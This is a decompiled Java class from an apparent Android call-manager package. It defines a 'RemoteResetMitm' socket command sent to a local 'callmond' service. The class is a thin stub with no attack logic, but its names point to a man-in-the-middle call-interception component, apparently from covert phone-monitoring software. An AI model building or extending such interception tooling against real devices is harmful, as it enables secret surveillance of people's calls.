package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;

public class RemoteResetMitm
  extends SocketCmd
{
  private static final long serialVersionUID = -7591749533717397474L;
  
  public RemoteResetMitm()
  {
    super(null, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmond";
  }
  
  protected String getTag()
  {
    return "RemoteResetMitm";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteResetMitm.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */